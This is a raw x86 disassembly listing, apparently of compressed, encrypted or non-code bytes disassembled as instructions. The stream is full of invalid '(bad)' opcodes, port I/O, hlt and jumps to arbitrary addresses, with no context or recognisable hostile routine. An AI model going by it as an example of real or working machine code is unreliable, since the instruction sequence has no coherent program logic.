  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    eax,0xa1000001
  41d38d:	ja     0x41d3c1
  41d38f:	out    dx,eax
  41d390:	or     ecx,ecx
  41d392:	fstp   DWORD PTR [edi+0x8]
  41d395:	leave  
  41d396:	and    esp,DWORD PTR [ebp-0x37e8d17a]
  41d39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d39d:	sub    BYTE PTR [ecx-0x541496bd],ch
  41d3a3:	push   esi
  41d3a4:	mov    al,0x76
  41d3a6:	add    dl,BYTE PTR [ecx+0x7511df69]
  41d3ac:	call   0x6365830d
  41d3b1:	or     cl,BYTE PTR [esi]
  41d3b3:	sbb    ebx,ebp
  41d3b5:	inc    ecx
  41d3b6:	popf   
  41d3b7:	in     eax,0x18
  41d3b9:	add    BYTE PTR [eax+esi*2+0x3a],dh
  41d3bd:	mov    bl,0xb9
  41d3bf:	or     DWORD PTR [ebx],edx
  41d3c1:	aad    0x45
  41d3c3:	cmp    al,0x76
  41d3c5:	pop    esi
  41d3c6:	cmp    ebp,DWORD PTR [esi]
  41d3c8:	std    
  41d3c9:	(bad)  
  41d3ca:	jle    0x41d3f8
  41d3cc:	mul    DWORD PTR [edx]
  41d3ce:	add    al,0xe
  41d3d0:	dec    eax
  41d3d1:	or     eax,0xf17fcef4
  41d3d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3d7:	dec    eax
  41d3d8:	inc    eax
  41d3d9:	push   cs
  41d3da:	fdivr  QWORD PTR [ebx]
  41d3dc:	and    ch,dl
  41d3de:	mov    ebp,0x40060f3e
  41d3e3:	or     eax,0x314f7600
  41d3e8:	ret    0xf3d8
  41d3eb:	clc    
  41d3ec:	mov    al,0xcd
  41d3ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3ef:	jmp    0xe48e684d
  41d3f4:	dec    eax
  41d3f5:	adc    BYTE PTR [edi+0x68],ah
  41d3f8:	xchg   DWORD PTR [edx],edx
  41d3fa:	outs   dx,DWORD PTR ds:[esi]
  41d3fb:	inc    esi
  41d3fc:	nop
  41d3fd:	lahf   
  41d3fe:	dec    ecx
  41d3ff:	out    0x43,eax
  41d401:	cs dec ecx
  41d403:	add    ch,bl
  41d405:	lods   al,BYTE PTR ds:[esi]
  41d406:	xchg   BYTE PTR fs:[edx-0x7a8f1de0],cl
  41d40d:	jbe    0x41d3ed
  41d40f:	or     dh,bl
  41d411:	fdiv   DWORD PTR [ecx+0x195e8d5]
  41d417:	test   al,0x3f
  41d419:	or     dl,BYTE PTR [esp+edx*2+0x1]
  41d41d:	add    BYTE PTR [ebp+0x21aeab11],0xdb
  41d424:	dec    eax
  41d425:	pop    ecx
  41d426:	scas   eax,DWORD PTR es:[edi]
  41d427:	push   esi
  41d428:	lahf   
  41d429:	not    DWORD PTR [ebx+0x6]
  41d42c:	jo     0x41d410
  41d42e:	push   cs
  41d42f:	pop    ss
  41d430:	or     dh,0xa0
  41d433:	pop    edi
  41d434:	inc    esp
  41d435:	push   es
  41d436:	in     al,dx
  41d437:	imul   ebx,DWORD PTR [edx-0x53],0xffffffb2
  41d43b:	inc    ebp
  41d43c:	xchg   edi,eax
  41d43d:	aaa    
  41d43e:	dec    ecx
  41d43f:	push   es
  41d440:	test   al,0x5b
  41d442:	push   ebx
  41d443:	lods   al,BYTE PTR ds:[esi]
  41d444:	jecxz  0x41d45c
  41d446:	data16 in al,dx
  41d448:	sub    al,0xbe
  41d44a:	sahf   
  41d44b:	ins    DWORD PTR es:[edi],dx
  41d44c:	loopne 0x41d3f9
  41d44e:	rcl    BYTE PTR [ecx],1
  41d450:	jae    0x41d3df
  41d452:	pop    ss
  41d453:	mov    eax,0xcbecae74
  41d458:	(bad)  
  41d459:	out    dx,al
  41d45a:	mov    al,ds:0x10356467
  41d45f:	dec    edx
  41d460:	fs in  al,0x24
  41d463:	stc    
  41d464:	fsubr  QWORD PTR [esi-0x6f]
  41d467:	mov    ds:0x82ea042a,al
  41d46c:	xor    al,0xcf
  41d46e:	mov    eax,0xde706e4f
  41d473:	add    al,0xa
  41d475:	rcr    DWORD PTR [edx+0x78bd7f65],1
  41d47b:	sbb    DWORD PTR [eax-0x24f324d],edi
  41d481:	loopne 0x41d4f8
  41d483:	mov    ah,0xf
  41d485:	sbb    ebx,0x76ff024b
  41d48b:	mov    ebx,0x249c4a77
  41d490:	sub    eax,0x0
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd0e0:0x79e72b89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0xd5000001
  41d50d:	mov    edi,edi
  41d50f:	sub    esp,eax
  41d511:	adc    BYTE PTR [esi],ch
  41d513:	(bad)  
  41d514:	stos   DWORD PTR es:[edi],eax
  41d515:	into   
  41d516:	shl    DWORD PTR [ebp+0x7a],1
  41d519:	bound  ebx,QWORD PTR [ebx+ebx*2+0x4f171d74]
  41d520:	or     ah,BYTE PTR [ecx+0x68]
  41d523:	psubusb mm2,mm3
  41d526:	out    dx,eax
  41d527:	ins    BYTE PTR es:[edi],dx
  41d528:	ficomp WORD PTR [ebx+ecx*1+0x3906b24d]
  41d52f:	xchg   BYTE PTR [edi-0x30],dh
  41d532:	xchg   BYTE PTR [ebx-0x25c99a0f],ch
  41d538:	(bad)  [esi]
  41d53a:	aaa    
  41d53b:	push   ebp
  41d53c:	stos   BYTE PTR es:[edi],al
  41d53d:	sbb    al,0xd1
  41d53f:	sti    
  41d540:	sti    
  41d541:	(bad)
  41d544:	jge    0x41d519
  41d546:	inc    esp
  41d547:	call   0x7513c227
  41d54c:	cmp    eax,0xc781be2f
  41d551:	mov    ds:0xc4eac398,al
  41d556:	lock mov esp,0xa29cd046
  41d55c:	mov    edx,0x3838d83b
  41d561:	mov    eax,0x5b2075cb
  41d566:	xlat   BYTE PTR ds:[ebx]
  41d567:	jmp    0x1432:0x3fc1716e
  41d56e:	mov    ah,0x6d
  41d570:	pop    esp
  41d571:	fs jmp 0x9775a0a8
  41d577:	sbb    eax,0x1c3a6c19
  41d57c:	dec    esi
  41d57d:	jb     0x41d5da
  41d57f:	dec    edx
  41d580:	add    eax,0xafa60941
  41d585:	call   FWORD PTR ds:0xa1abd01e
  41d58b:	aaa    
  41d58c:	js     0x41d5db
  41d58e:	xor    al,0xb0
  41d590:	mov    eax,0x82a5facc
  41d595:	cmp    DWORD PTR [edx],0x9b3e3a60
  41d59b:	cli    
  41d59c:	retf   
  41d59d:	cmp    eax,DWORD PTR [ecx+0x749ef379]
  41d5a3:	cmp    eax,0x5efeec3e
  41d5a8:	sbb    al,0x5
  41d5aa:	outs   dx,BYTE PTR ds:[esi]
  41d5ab:	pop    es
  41d5ac:	js     0x41d58c
  41d5ae:	outs   dx,BYTE PTR ds:[esi]
  41d5af:	push   esi
  41d5b0:	in     eax,dx
  41d5b1:	and    al,0x8
  41d5b3:	pop    edx
  41d5b4:	leave  
  41d5b5:	or     al,0x34
  41d5b7:	fisttp QWORD PTR [edi+0x44]
  41d5ba:	xchg   edi,eax
  41d5bb:	and    dh,BYTE PTR [edi+0x729bdbfb]
  41d5c1:	stos   DWORD PTR es:[edi],eax
  41d5c2:	out    dx,al
  41d5c3:	jle    0x41d574
  41d5c5:	clc    
  41d5c6:	add    eax,0x93fc3a6c
  41d5cb:	daa    
  41d5cc:	jmp    0x41d5d5
  41d5ce:	or     DWORD PTR [ebp-0x65],0xffffffb9
  41d5d2:	fstp   TBYTE PTR [edi+0x28]
  41d5d5:	sbb    eax,0x7d60fe56
  41d5da:	ins    BYTE PTR es:[edi],dx
  41d5db:	push   cs
  41d5dc:	shr    DWORD PTR [edi+0x74da0f5a],1
  41d5e2:	dec    esp
  41d5e3:	outs   dx,BYTE PTR ds:[esi]
  41d5e4:	dec    esp
  41d5e5:	push   di
  41d5e7:	dec    esi
  41d5e8:	bound  esi,QWORD PTR [ebp+ebx*2+0x6c066ada]
  41d5ef:	out    dx,eax
  41d5f0:	add    BYTE PTR [esp+eax*8],al
  41d5f3:	mov    ah,0xd8
  41d5f5:	add    BYTE PTR [ebx],cl
  41d5f7:	cmp    esi,DWORD PTR [edx]
  41d5f9:	aaa    
  41d5fa:	mov    dl,0xe7
  41d5fc:	mov    cl,0x2f
  41d5fe:	mov    eax,ds:0x57f84438
  41d603:	test   BYTE PTR [edx],al
  41d605:	in     al,0x36
  41d607:	scas   al,BYTE PTR es:[edi]
  41d608:	in     al,0x12
  41d60a:	std    
  41d60b:	leave  
  41d60c:	sbb    BYTE PTR [edx],0x25
  41d60f:	fcmovbe st,st(5)
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x5066e435
  41d681:	sbb    eax,0x38d5fcb7
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    eax,0x33000001
  41d68d:	addr16 cmc 
  41d68f:	xchg   edx,ecx
  41d691:	pop    ecx
  41d692:	adc    ah,ah
  41d694:	jb     0x41d69c
  41d696:	push   edx
  41d697:	mov    ch,0xcf
  41d699:	(bad)  
  41d69a:	push   edi
  41d69b:	(bad)  
  41d69d:	jmp    0x41d718
  41d69f:	sti    
  41d6a0:	test   BYTE PTR [eax+0x5ad840d7],dh
  41d6a6:	lds    esp,FWORD PTR [esi]
  41d6a8:	mov    al,0xfe
  41d6aa:	adc    ah,BYTE PTR [edi]
  41d6ac:	jg     0x41d69a
  41d6ae:	(bad)  
  41d6af:	mov    ds:0x226c0bba,eax
  41d6b4:	cmp    ah,BYTE PTR [eax+0x10]
  41d6b7:	(bad)  
  41d6b8:	fsubr  QWORD PTR [ebx+esi*4]
  41d6bb:	pop    ecx
  41d6bc:	sub    ebp,eax
  41d6be:	lea    edi,[esi+0x1dd8809d]
  41d6c4:	arpl   WORD PTR [ebp+0x5798a5e],si
  41d6ca:	push   ss
  41d6cb:	loop   0x41d6e3
  41d6cd:	arpl   WORD PTR [ebp+0x555942c1],dx
  41d6d3:	inc    eax
  41d6d4:	pop    ebp
  41d6d5:	sub    bl,BYTE PTR [edi-0x7fbb788c]
  41d6db:	leave  
  41d6dc:	loopne 0x41d6e7
  41d6de:	in     eax,dx
  41d6df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6e0:	popa   
  41d6e1:	mov    dh,0x9e
  41d6e3:	jg     0x41d70c
  41d6e5:	stc    
  41d6e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6e7:	jle    0x41d6b3
  41d6e9:	jle    0x41d681
  41d6eb:	call   0x14eb:0x7c41d4c5
  41d6f2:	pop    es
  41d6f3:	inc    eax
  41d6f4:	ins    DWORD PTR es:[edi],dx
  41d6f5:	xchg   edi,eax
  41d6f6:	dec    esi
  41d6f7:	xchg   bh,dh
  41d6f9:	mov    esp,0xb3ae2f31
  41d6fe:	xchg   ebx,eax
  41d6ff:	xchg   BYTE PTR [edx],dh
  41d701:	sbb    ebx,edx
  41d703:	jbe    0x41d6cb
  41d705:	xor    cl,BYTE PTR [ebp+0x305c2f90]
  41d70b:	and    ebx,0x37
  41d70e:	in     eax,dx
  41d70f:	sbb    al,0xca
  41d711:	dec    eax
  41d712:	sbb    DWORD PTR [eax-0x1b],0xfffffff2
  41d716:	pop    ss
  41d717:	jne    0x41d6c0
  41d719:	jge    0x41d789
  41d71b:	(bad)  
  41d71c:	out    0x49,al
  41d71e:	test   eax,0x9fb29b63
  41d723:	je     0x41d724
  41d725:	fucomi st,st(6)
  41d727:	(bad)  
  41d728:	sub    eax,0xcfe482c9
  41d72d:	test   bl,0x20
  41d730:	sahf   
  41d731:	adc    DWORD PTR [edi+0x437b5d88],ebx
  41d737:	push   ds
  41d738:	mov    bl,0x29
  41d73a:	mov    ecx,esi
  41d73c:	or     ah,ch
  41d73e:	iret   
  41d73f:	add    al,0x2d
  41d741:	xchg   esp,eax
  41d742:	mov    esi,0x5b1e855b
  41d747:	addr16 std 
  41d749:	pop    ebx
  41d74a:	idiv   DWORD PTR [eax]
  41d74c:	sub    BYTE PTR [esi+ebx*8],0x13
  41d750:	or     al,0xd0
  41d752:	fisttp DWORD PTR ds:0x493301f9
  41d758:	pop    es
  41d759:	jns    0x41d6e0
  41d75b:	jmp    0x41d779
  41d75d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d75e:	mov    ch,0xde
  41d760:	push   edx
  41d761:	imul   esi,esi,0x1dd70ce1
  41d767:	popa   
  41d768:	pop    ebp
  41d769:	or     al,0x22
  41d76b:	xchg   al,dl
  41d76d:	pop    edi
  41d76e:	cli    
  41d76f:	push   DWORD PTR [esi+0x20953be5]
  41d775:	fadd   QWORD PTR [ebx+0x69]
  41d778:	mov    cl,0x88
  41d77a:	das    
  41d77b:	scas   eax,DWORD PTR es:[edi]
  41d77c:	pop    ecx
  41d77d:	fcomp  DWORD PTR [edx-0x72]
  41d780:	jbe    0x41d7ed
  41d782:	hlt    
  41d783:	dec    edx
  41d784:	aam    0x25
  41d786:	xor    BYTE PTR [ecx],bl
  41d788:	or     DWORD PTR [ebx+edx*8+0x258f2587],ecx
  41d78f:	dec    esp
  41d790:	std    
	...
  41d7f1:	add    BYTE PTR [eax],al
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	dec    eax
  41d801:	sub    al,0x72
  41d803:	aam    0xda
  41d805:	cmp    DWORD PTR [ecx],eax
  41d807:	add    BYTE PTR ds:0x26000001,al
  41d80d:	jno    0x41d84e
  41d80f:	aas    
  41d810:	lock stos DWORD PTR es:[edi],eax
  41d812:	cld    
  41d813:	loop   0x41d83d
  41d815:	jge    0x41d7e6
  41d817:	mov    ebp,0x7c33252b
  41d81c:	cmp    ch,dl
  41d81e:	ret    0x2b51
  41d821:	xor    eax,0xade945ad
  41d826:	dec    ebp
  41d827:	pop    ecx
  41d828:	jo     0x41d809
  41d82a:	sub    ebx,ebp
  41d82c:	inc    esp
  41d82d:	xchg   BYTE PTR [esi-0x37372685],al
  41d833:	ds adc al,0x47
  41d836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d837:	fs cwde 
  41d839:	xlat   BYTE PTR ds:[ebx]
  41d83a:	xlat   BYTE PTR ds:[ebx]
  41d83b:	or     edx,ebp
  41d83d:	and    cl,bl
  41d83f:	cld    
  41d840:	repz mov bl,0x61
  41d843:	aad    0x2c
  41d845:	push   edx
  41d846:	cmp    DWORD PTR [ebp-0x377c586c],esi
  41d84c:	lahf   
  41d84d:	lea    ebp,[ebp-0x19]
  41d850:	ret    0x30ad
  41d853:	mov    BYTE PTR [edx],bh
  41d855:	lods   al,BYTE PTR ds:[esi]
  41d856:	mov    ds:0xea6a29eb,al
  41d85b:	and    ebx,eax
  41d85d:	stos   BYTE PTR es:[edi],al
  41d85e:	mov    bl,0xf6
  41d860:	xchg   DWORD PTR [esi+0x8484974],esp
  41d866:	cmp    BYTE PTR [eax],al
  41d868:	push   edi
  41d869:	cld    
  41d86a:	lock cdq 
  41d86c:	jl     0x41d830
  41d86e:	lahf   
  41d86f:	or     DWORD PTR [ebx],edx
  41d871:	scas   al,BYTE PTR es:[edi]
  41d872:	xchg   BYTE PTR [ecx+0x13fc80ac],ch
  41d878:	push   edi
  41d879:	xchg   ebx,eax
  41d87a:	and    eax,0xdbf0eab7
  41d87f:	adc    al,0xeb
  41d881:	pop    edx
  41d882:	retf   
  41d883:	add    ah,dl
  41d885:	jb     0x41d87a
  41d887:	or     cl,dh
  41d889:	mov    ch,0x9d
  41d88b:	xchg   ebp,eax
  41d88c:	or     ebp,DWORD PTR [eax+0x27]
  41d88f:	fistp  DWORD PTR [ecx]
  41d891:	pop    ss
  41d892:	dec    ebp
  41d893:	push   0xcf54be1b
  41d898:	inc    eax
  41d899:	ss shl al,cl
  41d89c:	pop    esp
  41d89d:	and    BYTE PTR [edi-0x327e93e8],dh
  41d8a3:	jmp    0x5557:0xc719a4a4
  41d8aa:	or     DWORD PTR ds:0x96aefcfe,esi
  41d8b0:	adc    BYTE PTR [ecx+edi*8-0x44],ah
  41d8b4:	outs   dx,DWORD PTR ds:[esi]
  41d8b5:	add    DWORD PTR [ebp+ebp*8-0x74],0x1a
  41d8ba:	push   ecx
  41d8bb:	pop    ebx
  41d8bc:	arpl   WORD PTR [esi],ax
  41d8be:	add    bh,ch
  41d8c0:	push   DWORD PTR [edi+0x40]
  41d8c3:	bound  edx,QWORD PTR [ecx-0x40]
  41d8c6:	mov    dl,0xcb
  41d8c8:	adc    al,BYTE PTR [ebx+0x5f]
  41d8cb:	push   eax
  41d8cc:	or     DWORD PTR [esp+ebx*2],esi
  41d8cf:	push   ebp
  41d8d0:	mov    es,WORD PTR [esi+0x5]
  41d8d3:	sub    DWORD PTR [ebx-0x9],ebx
  41d8d6:	ret    0x678c
  41d8d9:	pop    esi
  41d8da:	popf   
  41d8db:	sub    eax,0x5b598c4e
  41d8e0:	out    dx,eax
  41d8e1:	mov    esp,0x1ba24a58
  41d8e6:	cdq    
  41d8e7:	lods   eax,DWORD PTR ds:[esi]
  41d8e8:	mov    bh,0xa
  41d8ea:	mov    ch,0x1c
  41d8ec:	jo     0x41d8dd
  41d8ee:	cmp    BYTE PTR [esi],ah
  41d8f0:	and    dl,BYTE PTR [ebx-0x6e]
  41d8f3:	cmp    dh,ch
  41d8f5:	repz lds ebx,FWORD PTR [esi+0x49]
  41d8f9:	or     BYTE PTR ds:0x7b927918,dh
  41d8ff:	mov    esi,0x69b0fe6d
  41d904:	cmp    ebp,DWORD PTR [edi-0x7a]
  41d907:	mov    ebx,0xca8dcfc5
  41d90c:	mov    ebp,0x8d53bf28
	...
  41d971:	add    BYTE PTR [eax],al
  41d973:	add    ah,al
  41d975:	ins    BYTE PTR es:[edi],dx
  41d976:	pop    es
  41d977:	pushf  
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	gs mov bl,0x31
  41d982:	xchg   ebp,eax
  41d983:	lods   al,BYTE PTR ds:[esi]
  41d984:	fistp  QWORD PTR [edx]
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    eax,0xd2000001
  41d98d:	fiadd  DWORD PTR [edx+ebp*4+0x1941161f]
  41d994:	(bad)  
  41d996:	fdivr  QWORD PTR [ebx]
  41d998:	aad    0x54
  41d99a:	adc    edi,DWORD PTR [ebx+0x7eda3dbe]
  41d9a0:	rcr    al,cl
  41d9a2:	add    al,0x6c
  41d9a4:	test   BYTE PTR [eax+0x39],dl
  41d9a7:	mov    bl,0xf5
  41d9a9:	inc    edi
  41d9aa:	loop   0x41d9af
  41d9ac:	jp     0x41d9e5
  41d9ae:	jge    0x41d978
  41d9b0:	adc    BYTE PTR [ebx],0xcd
  41d9b3:	xlat   BYTE PTR ds:[ebx]
  41d9b4:	inc    ebx
  41d9b5:	stc    
  41d9b6:	in     eax,0x65
  41d9b8:	repnz mov cl,0x89
  41d9bb:	jnp    0x41d9d5
  41d9bd:	jmp    0x41d950
  41d9bf:	sar    DWORD PTR [edi],1
  41d9c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9c2:	dec    ebx
  41d9c3:	and    DWORD PTR [ebp-0x42],0xb29eb6ca
  41d9ca:	inc    esp
  41d9cb:	mov    al,ds:0x1c9c31a4
  41d9d0:	sub    edx,DWORD PTR [eax]
  41d9d2:	mov    al,0x8d
  41d9d4:	cmp    bh,BYTE PTR [ebp-0x5b]
  41d9d7:	push   cs
  41d9d8:	mov    fs,WORD PTR [ebx-0x5dec8048]
  41d9de:	push   0x35
  41d9e0:	sub    DWORD PTR [edx+0x15e0db64],eax
  41d9e6:	and    al,0x70
  41d9e8:	push   ebp
  41d9e9:	lods   al,BYTE PTR ds:[esi]
  41d9ea:	(bad)  
  41d9ed:	je     0x41d9c3
  41d9ef:	push   esi
  41d9f0:	cmc    
  41d9f1:	pushf  
  41d9f2:	(bad)  
  41d9f3:	jge    0x41d9b5
  41d9f5:	mov    ds:0xb368b1f6,eax
  41d9fa:	push   ds
  41d9fb:	push   edx
  41d9fc:	mov    esi,DWORD PTR [edx-0x42f32af8]
  41da02:	mov    esi,0x32db0ab5
  41da07:	add    bl,BYTE PTR [ecx+0x37]
  41da0a:	dec    edx
  41da0b:	jecxz  0x41da88
  41da0d:	out    dx,eax
  41da0e:	std    
  41da0f:	loope  0x41da22
  41da11:	adc    BYTE PTR [ebx-0x4d],cl
  41da14:	pop    ds
  41da15:	xchg   esp,eax
  41da16:	cs cmp eax,0xac29697f
  41da1c:	jge    0x41da9d
  41da1e:	or     eax,0x8e152415
  41da23:	or     edx,DWORD PTR [edi]
  41da25:	xchg   BYTE PTR [ecx+0x4456f1a0],dl
  41da2b:	fsub   QWORD PTR [ebx+eiz*2+0x593821a9]
  41da32:	xor    BYTE PTR [edx+0x60],ch
  41da35:	push   edx
  41da36:	mov    ds:0x9a5fd80e,eax
  41da3b:	jbe    0x41d9f8
  41da3d:	outs   dx,BYTE PTR ds:[esi]
  41da3e:	iret   
  41da3f:	cmp    DWORD PTR [edx+0x4d],0xd95d02d2
  41da46:	push   ds
  41da47:	jnp    0x41d9f8
  41da49:	enter  0xd02d,0x99
  41da4d:	aas    
  41da4e:	push   edi
  41da4f:	mul    BYTE PTR [edx]
  41da51:	xchg   ecx,eax
  41da52:	xchg   edi,eax
  41da53:	and    ebp,DWORD PTR [edx]
  41da55:	std    
  41da56:	hlt    
  41da57:	inc    esp
  41da58:	retf   
  41da59:	rcr    al,1
  41da5b:	jmp    DWORD PTR [edi+0x40]
  41da5e:	xlat   BYTE PTR ds:[ebx]
  41da5f:	int3   
  41da60:	jmp    0x7520:0xc583a248
  41da67:	jmp    0x41da70
  41da69:	xor    al,0xa4
  41da6b:	sub    ah,cl
  41da6d:	imul   eax,eax,0x20098e06
  41da73:	inc    edi
  41da74:	rcr    BYTE PTR [edx+ecx*4-0x19cbf004],1
  41da7b:	sbb    al,0x99
  41da7d:	xchg   edi,eax
  41da7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da7f:	xor    ecx,DWORD PTR [esi+ecx*2+0x5beb6595]
  41da86:	push   esi
  41da87:	push   esp
  41da88:	mov    ds:0x4c3fd7c2,al
  41da8d:	mov    dl,0xee
  41da8f:	ret    0xf
	...
  41daf2:	add    BYTE PTR [eax],al
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xfffffff5
  41db01:	cmc    
  41db02:	push   es
  41db03:	(bad)  
  41db04:	in     al,0x3b
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    eax,0x52000001
  41db0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db0e:	mov    bh,0xd1
  41db10:	pop    edx
  41db11:	mov    esi,0xab4a1ac4
  41db16:	push   ebp
  41db17:	sar    BYTE PTR [edx-0x59],0x4a
  41db1b:	out    dx,al
  41db1c:	push   ss
  41db1d:	push   es
  41db1e:	mov    cl,0x86
  41db20:	dec    ebp
  41db21:	outs   dx,DWORD PTR ds:[esi]
  41db22:	xlat   BYTE PTR ss:[ebx]
  41db24:	xor    bh,BYTE PTR [esi]
  41db26:	cwde   
  41db27:	sub    BYTE PTR [esi-0x4d],al
  41db2a:	int3   
  41db2b:	mov    bh,0x58
  41db2d:	mov    di,0x4ff5
  41db31:	add    edi,DWORD PTR [esi]
  41db33:	xchg   ecx,eax
  41db34:	dec    esi
  41db35:	mov    ?,WORD PTR [eax-0x26c19a2e]
  41db3b:	fsub   DWORD PTR [eax]
  41db3d:	mov    eax,0x31568867
  41db42:	pusha  
  41db43:	out    dx,al
  41db44:	adc    DWORD PTR [eax-0x75],0x7c
  41db48:	and    BYTE PTR [edi+0x12],0xa9
  41db4c:	retf   
  41db4d:	mov    eax,ds:0xa0fb65db
  41db52:	cmc    
  41db53:	pop    ebx
  41db54:	icebp  
  41db55:	add    ah,dh
  41db57:	rol    DWORD PTR [esi-0xe2f6617],cl
  41db5d:	ret    
  41db5e:	inc    esp
  41db5f:	ret    
  41db60:	rcl    BYTE PTR [esi],cl
  41db62:	retf   0xa586
  41db65:	pop    edi
  41db66:	dec    esp
  41db67:	(bad)  
  41db68:	sub    bl,BYTE PTR [edx+0x1]
  41db6b:	mov    esp,0xe87b636f
  41db70:	in     eax,dx
  41db71:	ss and esi,esp
  41db74:	or     eax,DWORD PTR [edx-0x28]
  41db77:	arpl   WORD PTR [eax+0x3e72380f],dx
  41db7d:	jge    0x41dbc0
  41db7f:	jmp    0x8947:0x120bde9b
  41db86:	mov    cl,0x66
  41db88:	mov    DWORD PTR [ecx+0x9],esp
  41db8b:	jmp    0x41dbfb
  41db8d:	cld    
  41db8e:	jg     0x41dbfa
  41db90:	and    bh,BYTE PTR fs:[edi-0x7ce468ac]
  41db97:	add    eax,0x983983dc
  41db9c:	dec    esi
  41db9d:	jle    0x41db73
  41db9f:	rol    BYTE PTR [edi],cl
  41dba1:	les    ebx,FWORD PTR [esi+0x59]
  41dba4:	pop    ss
  41dba5:	xchg   edi,eax
  41dba6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dba7:	jns    0x41db29
  41dba9:	push   esi
  41dbaa:	cmp    DWORD PTR [eax-0x5b0b7578],0xffffffc5
  41dbb1:	shr    BYTE PTR [ebp-0x450db56e],1
  41dbb7:	fsubr  QWORD PTR [esi]
  41dbb9:	ins    DWORD PTR es:[edi],dx
  41dbba:	aad    0x3a
  41dbbc:	xlat   BYTE PTR ds:[ebx]
  41dbbd:	outs   dx,DWORD PTR ds:[esi]
  41dbbe:	sbb    eax,0x86ed9232
  41dbc3:	mov    DWORD PTR [edx-0x4d],ecx
  41dbc6:	arpl   WORD PTR [ebp+0x62658b06],ax
  41dbcc:	and    al,0x9c
  41dbce:	jl     0x41dbdd
  41dbd0:	cwde   
  41dbd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbd2:	dec    esi
  41dbd3:	mov    eax,ds:0x338b7cda
  41dbd8:	push   ds
  41dbd9:	mov    ah,0xf5
  41dbdb:	push   es
  41dbdc:	outs   dx,DWORD PTR ds:[esi]
  41dbdd:	pop    es
  41dbde:	sbb    eax,0x7f0ec12a
  41dbe3:	or     al,0x65
  41dbe5:	sbb    eax,0xc3fbe100
  41dbea:	mov    bh,0x2
  41dbec:	sbb    al,BYTE PTR [eax+0x4e]
  41dbef:	dec    edi
  41dbf0:	retf   
  41dbf1:	pop    esp
  41dbf2:	xchg   edx,eax
  41dbf3:	clc    
  41dbf4:	inc    esi
  41dbf5:	jne    0x41dc43
  41dbf7:	and    eax,0x4cfeac28
  41dbfc:	cli    
  41dbfd:	les    esi,FWORD PTR [esi-0x23e0bc08]
  41dc03:	sub    BYTE PTR [edx+0x1e],dh
  41dc06:	mov    DWORD PTR [esi-0x4],eax
  41dc09:	out    0x40,al
  41dc0b:	ret    
  41dc0c:	dec    esp
  41dc0d:	repz pop es
  41dc0f:	(bad)  
  41dc10:	rol    BYTE PTR [eax],1
	...
  41dc72:	add    BYTE PTR [eax],al
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x46b0d050]
  41dc81:	xchg   BYTE PTR [ecx],dl
  41dc83:	fucomip st,st(1)
  41dc85:	cmp    al,0x1
  41dc87:	add    BYTE PTR ds:0xaa000001,al
  41dc8d:	sbb    al,0x8
  41dc8f:	lods   eax,DWORD PTR ds:[esi]
  41dc90:	ds das 
  41dc92:	(bad)  
  41dc94:	inc    ecx
  41dc95:	inc    esp
  41dc96:	fs int 0x7f
  41dc99:	dec    edi
  41dc9a:	or     edi,DWORD PTR [eax-0x5bb650f5]
  41dca0:	test   DWORD PTR [ebp+0x7d5818f2],eax
  41dca6:	loopne 0x41dc89
  41dca8:	sbb    al,0x2e
  41dcaa:	xchg   ebp,eax
  41dcab:	and    eax,0xe7f126dd
  41dcb0:	(bad)  
  41dcb1:	fld    st(0)
  41dcb3:	sar    BYTE PTR [ebx],0x6e
  41dcb6:	fs dec ebx
  41dcb8:	sub    al,0x36
  41dcba:	xchg   esp,eax
  41dcbb:	cwde   
  41dcbc:	aas    
  41dcbd:	in     al,0xf4
  41dcbf:	cmp    dh,BYTE PTR [esi+eax*4]
  41dcc2:	pop    ss
  41dcc3:	jne    0x41dd08
  41dcc5:	leave  
  41dcc6:	mov    eax,0xb84a873b
  41dccb:	scas   al,BYTE PTR es:[edi]
  41dccc:	and    esp,DWORD PTR [eax+0x785f3f1b]
  41dcd2:	daa    
  41dcd3:	add    DWORD PTR [edi],ebp
  41dcd5:	push   cs
  41dcd6:	pop    ss
  41dcd7:	mov    ebx,0x7c44adec
  41dcdc:	enter  0xbe60,0xf2
  41dce0:	imul   esi,DWORD PTR [ebx-0x27],0x6de3331d
